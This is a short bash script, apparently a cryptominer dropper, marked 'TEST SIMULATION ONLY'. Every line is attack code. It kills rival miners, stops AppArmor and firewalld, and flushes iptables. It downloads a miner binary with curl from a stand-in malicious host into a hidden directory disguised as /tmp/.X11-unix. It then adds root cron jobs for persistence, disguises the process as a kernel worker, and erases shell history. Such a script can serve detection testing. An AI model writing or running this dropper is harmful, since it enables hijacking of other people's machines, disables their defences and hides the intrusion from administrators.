#!/bin/bash
# Cryptominer dropper script - TEST SIMULATION ONLY

# Kill competing miners
pkill -9 xmrig 2>/dev/null
pkill -9 minerd 2>/dev/null
pkill -9 cpuminer 2>/dev/null

# Disable security tools
systemctl stop apparmor 2>/dev/null
systemctl stop firewalld 2>/dev/null
iptables -F 2>/dev/null

# Create hidden directory
mkdir -p /tmp/.X11-unix/.cache
cd /tmp/.X11-unix/.cache

# Download miner binary
curl -sL http://malicious-server.onion/xmrig -o .sysupdate
chmod +x .sysupdate

# Create persistence
echo "*/5 * * * * /tmp/.X11-unix/.cache/.sysupdate -c config.json" >> /var/spool/cron/root
echo "@reboot /tmp/.X11-unix/.cache/.sysupdate -c config.json" >> /var/spool/cron/root

# Modify process name to hide
exec -a "[kworker/0:0]" ./.sysupdate -c config.json &

# Clean traces
history -c
rm -f ~/.bash_history
unset HISTFILE

# Resource limiting to avoid detection
renice 19 $$ 2>/dev/null
ionice -c 3 -p $$ 2>/dev/null
